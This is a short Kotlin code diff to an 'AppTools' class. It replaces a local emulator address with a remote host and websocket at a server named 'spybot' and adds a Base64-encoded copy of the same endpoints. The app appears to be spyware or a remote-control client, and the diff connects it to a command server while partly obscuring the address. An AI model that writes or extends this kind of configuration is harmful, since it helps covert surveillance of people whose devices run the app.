@@ -12,11 +12,13 @@ import java.util.*
 
 class AppTools {
     companion object {
-        private const val DEFAULT_DATA = ""
+        // ✅ Base64 config for Render server
+        private const val DEFAULT_DATA = "eyJob3N0IjoiaHR0cHM6Ly9zcHlib3QtMGt4eC5vbmVyZW5kLmNvbS8iLCJzb2NrZXQiOiJ3c3M6Ly9zcHlib3QtMGt4eC5vbmVyZW5kLmNvbS8ifQ=="
 
+        // ✅ DEFAULT_APP_DATA updated to Render server
         private val DEFAULT_APP_DATA = AppData(
-            host = "http://10.0.2.2:8999/",
-            socket = "ws://10.0.2.2:8999/"
+            host = "https://spybot-0kxx.onrender.com/",
+            socket = "wss://spybot-0kxx.onrender.com/"
         )
 
         fun getAppData(): AppData {
